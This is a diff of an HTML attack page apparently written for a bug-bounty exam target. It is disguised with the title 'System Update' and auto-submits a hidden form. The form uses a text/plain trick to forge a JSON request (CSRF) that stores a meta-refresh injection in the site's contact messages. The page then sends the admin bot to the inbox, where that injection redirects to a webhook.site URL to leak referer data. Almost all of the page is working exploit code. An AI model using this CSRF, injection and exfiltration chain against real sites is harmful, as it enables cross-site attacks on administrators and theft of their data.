@@ -1,44 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Verification</title>
+    <title>System Update</title>
 </head>
 <body>
-    <h1>Processing... Please wait.</h1>
+    <h1>Update in progress...</h1>
+    
+    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/contact/submit" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"name":"test","email":"jikuxn9@gmail.com","phone":"","subject":"Urgent: Session Verification","message":"<meta http-equiv=\"refresh\" content=\"0;url=https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27/leak?data=check_referer\">","category":"general","priority":"medium","ignore":"' value='"}'>
+    </form>
+
     <script>
-        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
-        const webhook = "https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27";
+        // 1. Submit the form to store the payload
+        document.getElementById("exploitForm").submit();
 
-        const payload = {
-            "name": "test",
-            "email": "jikuxn9@gmail.com",
-            "phone": "",
-            "subject": "Urgent: Session Verification",
-            "message": "<meta http-equiv='refresh' content='0;url=" + webhook + "/leak?data=check_referer'>",
-            "category": "general",
-            "priority": "medium"
-        };
-
-        async function launch() {
-            // Step 1: CSRF the JSON payload
-            // We use 'no-cors' to ensure the request goes through even if CORS fails
-            await fetch(targetApi, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            });
-
-            // Step 2: Redirect the Admin to the page where they view messages
-            // This is the CRITICAL part. If the bot doesn't go here, the XSS won't fire.
-            setTimeout(() => {
-                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
-            }, 1500);
-        }
-
-        launch();
+        // 2. Wait 2 seconds, then redirect the admin to the inbox 
+        // to make them "view" the message and trigger the Meta Refresh.
+        setTimeout(() => {
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
+        }, 2000);
     </script>
 </body>
 </html>
